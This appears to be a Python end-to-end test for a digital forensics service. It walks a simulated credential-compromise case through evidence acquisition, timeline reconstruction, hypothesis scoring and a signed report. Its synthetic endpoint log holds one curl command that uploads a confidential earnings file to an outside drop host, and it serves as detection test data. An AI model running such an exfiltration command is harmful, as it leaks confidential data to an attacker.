"""
test_forensics_e2e_module48.py
End-to-end 12-step forensic investigation scenario drill for OMNIA Module 48:
Autonomous Digital Forensics, Evidence Preservation & Incident Investigation Intelligence.
"""

import unittest
import os
import shutil
import json
import sqlite3
import time
import gc

from forensics.models import (
    ForensicCase, CaseStatus, EvidenceArtifact, ArtifactType,
    CustodyOperation, TimelineEvent, EvidenceCorrelation,
    ForensicHypothesis, HypothesisStatus, StatementCategory,
    EvidenceReliabilityTier
)
from forensics.service import DigitalForensicsOrchestrator
from persistence.migrations import MIGRATION_V33


class TestForensicsE2EModule48(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.test_db = "test_forensics_e2e_temp.db"
        cls.test_vault_dir = "artifacts/test_forensics_e2e_vault"
        os.makedirs(cls.test_vault_dir, exist_ok=True)

        conn = sqlite3.connect(cls.test_db)
        conn.executescript(MIGRATION_V33)
        conn.close()

        cls.service = DigitalForensicsOrchestrator(
            db_path=cls.test_db,
            vault_dir=cls.test_vault_dir
        )

    @classmethod
    def tearDownClass(cls):
        del cls.service
        gc.collect()
        time.sleep(0.1)
        if os.path.exists(cls.test_db):
            try:
                os.remove(cls.test_db)
            except Exception:
                pass
        if os.path.exists(cls.test_vault_dir):
            shutil.rmtree(cls.test_vault_dir, ignore_errors=True)

    def test_full_incident_forensics_lifecycle(self):
        """
        12-Step Full Scenario:
        1. Open formal forensic investigation case scoped to suspicious cloud session.
        2. Acquire identity audit logs (IDP) with cryptographic preservation and custody logging.
        3. Acquire cloud audit trail logs (IAM & Storage access).
        4. Acquire endpoint process telemetry from developer workstation.
        5. Verify unbroken chain-of-custody across all 3 acquired artifacts.
        6. Reconstruct normalized UTC chronological timeline across heterogeneous sources.
        7. Execute cross-source evidence correlation (matching compromised principal and IP).
        8. Detect timeline anomalies (e.g., rapid IP geolocation transition / impossible travel).
        9. Formulate competing hypotheses: 'Account Hijack via Session Hijacking' vs 'Authorized Developer Activity'.
        10. Score hypotheses using corroborating and contradictory evidence.
        11. Apply cryptographic Legal Hold to preserve evidence with human approval token.
        12. Synthesize and sign structured forensic investigation report with FACT/INFERENCE/HYPOTHESIS/UNKNOWN epistemic tags.
        """
        # Step 1: Open formal case
        case = self.service.open_investigation_case(
            title="CRITICAL: Compromised Developer Credentials & Exfiltration Drill",
            description="Investigating unauthorized API keys created by developer account in us-central1",
            incident_id="soc_inc_20261101_001",
            scope_definition={"allowed_sources": ["idp", "cloud_audit", "endpoint"], "investigation_tier": "P1"},
            lead_investigator="detective_eni"
        )
        self.assertIsNotNone(case)
        self.assertEqual(case.status, CaseStatus.OPEN)

        # Step 2: Acquire Identity Logs
        idp_raw = json.dumps([
            {"user": "dev_alex@corp.internal", "action": "LOGIN_SUCCESS", "ip_address": "198.51.100.22", "timestamp": "2026-11-01T04:15:00Z"},
            {"user": "dev_alex@corp.internal", "action": "SESSION_REFRESH", "ip_address": "203.0.113.88", "timestamp": "2026-11-01T04:18:00Z"}
        ]).encode("utf-8")
        art_idp = self.service.acquire_artifact(
            case_id=case.case_id,
            source_type=ArtifactType.IDENTITY_AUDIT,
            source_identifier="okta_idp_stream",
            artifact_name="idp_auth_session.json",
            raw_data=idp_raw,
            operator="detective_eni"
        )
        self.assertEqual(art_idp.integrity_status, "VERIFIED")

        # Step 3: Acquire Cloud Audit Trail
        cloud_raw = json.dumps([
            {"principalEmail": "dev_alex@corp.internal", "methodName": "iam.serviceAccounts.createKey", "resourceName": "projects/prod/serviceAccounts/data-exporter", "callerIp": "203.0.113.88", "timestamp": "2026-11-01T04:22:00Z"},
            {"principalEmail": "dev_alex@corp.internal", "methodName": "storage.objects.get", "resourceName": "gs://confidential-financials/q3_earnings.csv", "callerIp": "203.0.113.88", "timestamp": "2026-11-01T04:25:00Z"}
        ]).encode("utf-8")
        art_cloud = self.service.acquire_artifact(
            case_id=case.case_id,
            source_type=ArtifactType.CLOUD_AUDIT_LOG,
            source_identifier="gcp_cloudaudit_logs",
            artifact_name="cloud_audit_dump.json",
            raw_data=cloud_raw,
            operator="detective_eni"
        )
        self.assertEqual(art_cloud.integrity_status, "VERIFIED")

        # Step 4: Acquire Endpoint Process Telemetry
        endpoint_raw = json.dumps([
            {"user": "dev_alex@corp.internal", "process_name": "curl.exe", "pid": 5812, "command_line": "curl -F file=@q3_earnings.csv https://temp-drop.onion/upload", "timestamp": "2026-11-01T04:27:00Z"}
        ]).encode("utf-8")
        art_endpoint = self.service.acquire_artifact(
            case_id=case.case_id,
            source_type=ArtifactType.ENDPOINT_PROCESS,
            source_identifier="edr_workstation_alex",
            artifact_name="edr_proc_history.json",
            raw_data=endpoint_raw,
            operator="detective_eni"
        )
        self.assertEqual(art_endpoint.integrity_status, "VERIFIED")

        # Step 5: Verify unbroken chain of custody
        for art in [art_idp, art_cloud, art_endpoint]:
            res = self.service.verify_artifact_custody(case.case_id, art.artifact_id)
            self.assertTrue(res["valid"])
            self.assertEqual(res["integrity_status"], "VERIFIED_UNBROKEN")

        # Step 6: Reconstruct Chronological Timeline
        timeline = self.service.reconstruct_case_timeline(case.case_id)
        self.assertEqual(len(timeline), 5)
        # Check timestamps are monotonically non-decreasing
        for i in range(len(timeline) - 1):
            self.assertLessEqual(timeline[i].timestamp_utc, timeline[i+1].timestamp_utc)

        # Step 7: Cross-Source Evidence Correlation
        correlations = self.service.correlate_evidence(case.case_id)
        self.assertGreaterEqual(len(correlations), 2)
        # Verify correlations identified shared actor or IP
        corr_types = {c.correlation_type for c in correlations}
        self.assertTrue("SHARED_ACTOR" in corr_types or "SHARED_IP" in corr_types)

        # Step 8: Detect Timeline Anomalies
        anomalies = self.service.timeline_engine.detect_timeline_anomalies(case.case_id)
        self.assertGreaterEqual(len(anomalies), 1)
        self.assertEqual(anomalies[0]["type"], "RAPID_IP_TRANSITION")

        # Step 9: Competing Hypotheses
        h_compromise = self.service.create_hypothesis(
            case_id=case.case_id,
            title="Session Token Hijack and Malicious Exfiltration",
            theory_description="Attacker hijacked Alex's active session cookie, created service account key, and exfiltrated confidential financials."
        )
        h_authorized = self.service.create_hypothesis(
            case_id=case.case_id,
            title="Authorized Remote Backup by Employee",
            theory_description="Alex legitimately accessed the files while travelling on corporate VPN.",
            competing_with_id=h_compromise.hypothesis_id
        )

        # Step 10: Score Hypotheses
        eval_comp = self.service.evaluate_hypothesis(
            hypothesis_id=h_compromise.hypothesis_id,
            supporting_evidence=[
                "IP 203.0.113.88 geolocates to non-corporate Tor exit relay",
                "Workstation endpoint spawned unapproved curl exfiltration process",
                "Service account key created without change management ticket"
            ]
        )
        self.assertEqual(eval_comp["status"], HypothesisStatus.SUPPORTED.value)

        eval_auth = self.service.evaluate_hypothesis(
            hypothesis_id=h_authorized.hypothesis_id,
            contradictory_evidence=[
                "Alex confirms he was asleep during 04:15 UTC window",
                "VPN gateway logs contain zero records for IP 203.0.113.88",
                "Exfiltration target domain is known untrusted file drop"
            ]
        )
        self.assertEqual(eval_auth["status"], HypothesisStatus.REFUTED.value)

        # Step 11: Apply Cryptographic Legal Hold
        hold = self.service.apply_legal_hold(
            case_id=case.case_id,
            hold_reason="Active investigation of data exfiltration for litigation & compliance hold",
            applied_by="detective_eni",
            approval_token="appr_legal_hold_auth_99182"
        )
        self.assertTrue(hold.is_active)
        refreshed_case = self.service.get_case(case.case_id)
        self.assertTrue(refreshed_case.legal_hold_active)

        # Step 12: Synthesize and Sign Structured Forensic Report
        report = self.service.generate_report(case_id=case.case_id, investigator="detective_eni")
        self.assertIsNotNone(report)
        self.assertTrue(report.title.startswith("Forensic Investigation Report"))
        self.assertGreaterEqual(len(report.facts), 3)
        self.assertGreaterEqual(len(report.inferences), 1)
        self.assertGreaterEqual(len(report.hypotheses), 2)
        self.assertTrue(len(report.cryptographic_seal) == 64)
        self.assertIn("Favored theory: Session Token Hijack", report.executive_summary)


if __name__ == "__main__":
    unittest.main()
